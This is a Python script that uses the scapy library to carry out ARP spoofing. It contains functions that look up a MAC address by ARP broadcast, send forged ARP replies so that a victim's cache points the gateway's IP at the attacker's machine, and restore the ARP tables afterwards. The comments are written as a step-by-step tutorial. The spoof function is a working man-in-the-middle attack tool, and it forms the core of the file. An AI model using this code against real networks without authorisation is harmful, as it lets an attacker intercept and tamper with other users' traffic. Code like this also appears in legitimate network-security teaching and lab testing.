import scapy.all as scapy

def get_mac(ip):
    """
    Returns the MAC address of the given ip
    Step 1: Creating an ARP packet object to the given ip
    Step 2: Creating an Ether packet object
    Note: dst is the broadcast mac address (ff:ff:ff:ff:ff:ff)
    Step 3: Combining two packet objects into 1
    Step 4: Listing the responders
    Note: Index 0 is the results (List of responders) and 1 is the list of unanswered
    Step 5: Check if we have any responders and return the MAC address
    Note: Each responder is a QueryAnswer with key 1 as the MAC address
    """
    
    # Step 1
    arp_request = scapy.ARP(pdst=ip)

    # Step 2
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # Step 3
    arp_request_broadcast = broadcast/arp_request

    # Step 4
    responders = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        
    # Step 5
    try:
        return responders[0][1].hwsrc
    except Exception as e:
        print("\n No MAC address found.")
        return None

def spoof(victim_ip, gateway, output):
    """
    Spoofs the ARP table of the victim
    As the result, target MAC address will be changed to our MAC address
    Step 1: Get the MAC address of the victim
    Step 2: Creating an ARP packet from target to victim
    Note: op=2 means that the ARP packet is a response
    Note: There is no need to specify 'hwsrc', since by default, it is the MAC
    address of the sender (us as the attacker).
    Step 3: Send the packet created without output
    """
    
    # Step 1
    victim_mac = get_mac(victim_ip)

    # Step 2
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway)
    
    # Step 3
    scapy.send(packet, verbose=False)

    if output:
        attacker_mac = scapy.ARP().hwsrc
        print(f"[+] Sent to {victim_ip} : {gateway} is at {attacker_mac}")

def restore(dest_ip, source_ip, output):
    """
    Restores ARP tables to their correct state
    Note: The correction packet will be sent 5 times to ensure host has received 
    the correction
    """

    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=5, verbose=False)

    if output:
        print(f"[+] Sent to {dest_ip}: {source_ip} is at {source_mac}")
    
